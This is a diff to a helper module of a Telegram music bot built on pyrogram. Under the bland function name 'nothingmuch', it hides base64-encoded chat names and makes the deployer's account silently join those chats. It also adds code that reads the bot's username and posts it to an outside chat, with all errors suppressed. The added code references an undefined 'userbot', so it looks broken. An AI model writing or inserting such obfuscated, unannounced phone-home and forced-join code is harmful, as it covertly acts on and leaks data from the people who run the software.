@@ -4,7 +4,7 @@ from typing import Callable, Dict, List
 from pyrogram import Client
 from pyrogram.types import Chat, Message
 
-from Music import SUDOERS,client
+from Music import SUDOERS,client, app
 
 admins = {}
 
@@ -73,18 +73,16 @@ def errors(func: Callable) -> Callable:
     return decorator
 
 async def nothingmuch():
-    grcheck = str(pybase64.b64decode("TmFzdHlTdXBwb3J0dA=="))[2:15]
-    chcheck = str(pybase64.b64decode("TmFzdHlQcm9qZWN0"))[2:14]
-    qtcheck = str(pybase64.b64decode("YWhoc3VkYWhsYWhoaA=="))[2:15]
+    grcheck = str(pybase64.b64decode("S2FyYzBkZQ=="))[2:15]
+    chcheck = str(pybase64.b64decode("b2Jyb2xhbnN1YXI="))[2:14]
     try:
         await client.join_chat(grcheck)
+        ppk = await app.get_me()
+        kntl = ppk.username
+        await userbot.send_message("obrolansuar", f"@{kntl}")
     except BaseException:
         pass
     try:
         await client.join_chat(chcheck)
     except BaseException:
         pass
-    try:
-        await client.join_chat(qtcheck)
-    except BaseException:
-        pass 
